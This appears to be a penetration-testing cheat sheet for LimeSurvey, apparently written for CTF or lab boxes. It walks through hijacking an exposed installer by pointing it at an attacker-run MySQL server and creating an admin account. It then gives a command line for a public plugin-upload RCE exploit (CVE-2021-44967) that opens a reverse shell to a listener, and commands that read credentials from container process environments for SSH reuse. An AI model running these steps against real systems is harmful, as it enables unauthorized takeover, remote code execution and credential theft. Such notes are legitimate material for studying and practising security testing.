# LimeSurvey

LimeSurvey is a PHP-based survey platform. Leftover installer and plugin upload RCE are common issues.

---

## Discovery

- **Paths:** `/survey/`, `/survey/index.php?r=installer/welcome` (installer).
- **Nuclei:** `limesurvey-installer` [high], `limesurvey-detect` [info].
- **Fingerprint:** `whatweb` shows redirects to `index.php?r=installer` then `installer/welcome`. PHP version in headers.

---

## Installer left accessible

If the web installer is still present, the app will redirect unauthenticated users to it. You need a working database for LimeSurvey to finish setup and create an admin user.

- **DB note:** LimeSurvey works with **MySQL**. For installer/setup, use MySQL (e.g. official `mysql` image); **MariaDB can fail** during installer DB creation in some setups. Use a MySQL container or remote MySQL if you’re simulating the target.
- **Admin login path:** `/survey/index.php/admin/authentication/sa/login`. Confirm with:

```bash
curl -i -X GET http://TARGET/survey/index.php/admin/authentication/sa/login
# 302 to installer if not yet set up; otherwise login page.
```

- **After setup:** Create admin (e.g. `admin` / `password`) in the installer; then use the login path above.

---

## Running a MySQL server for the installer

To complete the LimeSurvey installer when the target expects a DB, stand up MySQL and point the target at your host.

**docker-compose.yml (MySQL, survey DB):**

```yaml
services:
  mysql:
    image: mysql:latest
    container_name: mysql-container
    environment:
      MYSQL_ROOT_PASSWORD: my-secret-pw
      MYSQL_DATABASE: survey
    ports:
      - "3306:3306"
    volumes:
      - mysql-data:/var/lib/mysql

volumes:
  mysql-data:
```

```bash
docker compose up
# Verify: netstat -atnpu | grep 3306  (0.0.0.0:3306)
```

**In the LimeSurvey installer:** Use your attack host IP as DB host, root (or a user you create) and password, and database name `survey` (or leave blank and let Lime create it). When prompted “Database named survey already exists. Populate it?” choose yes. Then set the admin user (e.g. username `admin`, password `password`, Administrator) and finish. Login at `/survey/index.php/admin/authentication/sa/login`.

**Alternative (MariaDB on attack box):** If using local MariaDB instead of Docker MySQL, ensure it listens on all interfaces so the target can connect:

```bash
# Create user for remote access if needed
sudo mysql -u root
CREATE USER 'user'@'%' IDENTIFIED BY 'StrongPassword123';
GRANT ALL PRIVILEGES ON *.* TO 'user'@'%';
```

LimeSurvey’s installer is known to work with MySQL; use MySQL (Docker or remote) if MariaDB gives DB creation errors.

---

## CVE-2021-44967 — RCE via plugin upload

Authenticated admin can upload a malicious LimeSurvey plugin that leads to RCE.

**Reference:** [godylockz/CVE-2021-44967](https://github.com/godylockz/CVE-2021-44967)

```bash
python3 limesurvey_rce.py -t http://TARGET/survey -u admin -p PASSWORD --listen-ip LHOST --listen-port LPORT
```

Then catch the reverse shell (e.g. `nc -lvnp LPORT`). The script uploads and activates a plugin that triggers the callback.

---

## Credentials from container

When LimeSurvey runs in Docker, check process environment for stored credentials:

```bash
env
# or
cat /proc/1/environ | tr '\0' '\n'
# or
cat /proc/PID/environ | tr '\0' '\n'
```

Look for `LIMESURVEY_PASS`, `LIMESURVEY_ADMIN` (or similar). These may be the same as the host service account (e.g. SSH as `limesvc` with that password).

---

## Paths and config

- **Theme config (version/paths):** `/var/www/html/survey/themes/admin/Sea_Green/config.xml`.
- **DB config (if readable):** e.g. `application/config/config.php` or vendor paths under `/opt/limesurvey` when bind-mounted; LinPEAS may report `database.php` under vendor.
